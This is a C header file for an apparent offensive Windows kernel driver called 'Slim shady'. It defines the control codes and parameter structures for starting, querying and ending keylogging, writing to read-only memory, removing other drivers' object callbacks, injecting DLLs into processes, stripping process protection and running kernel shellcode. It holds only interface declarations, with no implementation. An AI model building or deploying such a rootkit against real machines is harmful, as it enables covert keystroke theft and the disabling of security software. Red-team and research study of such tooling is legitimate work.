#pragma once

/*
	Common definitions to the driver and its clients
*/

#define DRIVER_NAME L"Slim shady"
#define DEVICE_NAME L"\\Device\\" DRIVER_NAME
#define SYMLINK_NAME L"\\??\\" DRIVER_NAME

#define MAX_PATH_LENGTH 128

/*
	Copy to readonly memory using MDL
*/
#define IOCTL_COPY_TO_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct CopyToMemoryParams {
	PVOID Dest;
	PVOID Source;
	size_t Length;
};

/*
	Starts keylogging.
*/
#define IOCTL_START_KEYLOGGING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

/*
	Queries logged keys.

	If the output buffer is sizeof(ULONG) big, we'll output the size of the currently stored buffer. Otherwise, the output
	will be formatted as KeyloggingOutputBuffer.
*/
#define IOCTL_QUERY_KEYLOGGING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

/*
	Output of IOCTL_QUERY_KEYLOGGING, records keystrokes.
*/
struct KeyloggingOutputBuffer {
	ULONG OutputBufferLength;
	CHAR Buffer[ANYSIZE_ARRAY];
};

/*
	Ends keylogging session.
*/
#define IOCTL_END_KEYLOGGING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

/*
	Removes object callbacks that were loaded by a specific driver
*/
#define IOCTL_REMOVE_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct RemoveCallbacksParams {
	CHAR ImageName[16];
};

/*
	Injects a dll into a process.
*/
#define IOCTL_INJECT_LIBRARY_TO_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct InjectLibraryParams {
	HANDLE Tid;
	CHAR DllPath[MAX_PATH_LENGTH];
};

/*
	Removes any protection policies applied to a process
*/
#define IOCTL_REMOVE_PROTECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct RemoveProtectionParams {
	ULONG Pid;
};

/*
	Restore the protection policy of a process
*/
#define IOCTL_RESTORE_PROTECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct RestoreProtectionParams {
	ULONG Pid;
};

/*
	Run KM shellcode
*/
#define IOCTL_RUN_KM_SHELLCODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct KmContext {
	PVOID MmGetSystemRoutineAddress;
	PVOID KernelBase;
};

struct KmShellcodeParameters : KmContext {
	PVOID Input;
	SIZE_T InputLength;
	PVOID Output;
	ULONG* OutputLength;
};

typedef VOID(*KM_SHELLCODE_ROUTINE)(KmShellcodeParameters*);

struct RunKmShellcodeParams {
	KM_SHELLCODE_ROUTINE KmShellcode;
	SIZE_T KmShellcodeSize;
	PVOID Input;
	SIZE_T InputLength;
};
